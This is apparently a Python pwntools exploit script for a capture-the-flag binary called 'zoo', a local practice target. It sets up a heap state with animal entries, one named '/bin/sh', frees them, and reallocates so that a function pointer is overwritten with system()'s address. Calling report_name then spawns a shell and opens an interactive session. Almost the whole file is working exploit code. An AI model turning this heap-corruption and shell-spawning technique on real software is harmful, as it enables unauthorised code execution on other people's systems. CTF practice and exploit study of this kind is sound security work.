#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *


se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    gdbscript += 'set follow-fork-mode parent\n'
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./zoo')
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])

def add_animal(name):
    sla("> ", "1")
    sla("2) Panda", "1")
    sa("Name of animal?", name)

def remove_animal(idx):
    sla("> ", "2")
    sla("Zone number? (0-9)", str(idx))

def report_name(idx):
    sla("> ", "3")
    sla("Zone number? (0-9)", str(idx))


p = process("./zoo")

add_animal("a" * 0x18) #0
add_animal("/bin/sh;/bin/sh;/bin/sh\x00") #1
add_animal("b" * 0x18) #2
add_animal("b" * 0x18) #3

remove_animal(0)
remove_animal(1)
remove_animal(2)
remove_animal(3)

sys_addr = 0x401120
add_animal(p64(sys_addr) + b"a" * 8 + b'\x10') #0

# debug()
report_name(2)


# get_shell_addr = 0x401276
# add_animal(0x10, p64(get_shell_addr)) #0
# debug()


p.interactive()


